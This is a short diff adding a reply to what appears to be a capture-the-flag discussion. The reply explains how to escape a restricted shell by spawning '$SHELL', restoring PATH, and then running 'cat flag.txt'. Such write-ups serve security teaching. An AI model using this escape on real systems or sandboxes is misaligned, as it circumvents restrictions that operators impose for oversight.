@@ -48,3 +48,18 @@ or even more stupid
 /bin/cat flag.txt
 
 (Since I can not try this anymore it would be nice to hear from another group who tried this.)
+
+Response :
+
+Yes it is possible, you can open a new shell (with no sed restriction) with :
+
+$SHELL
+
+and then just load the environment variables with :
+
+export PATH=$PATH:/usr/sbin:/usr/bin:/sbin:/bin
+
+then to get the flag :
+
+cat flag.txt
+
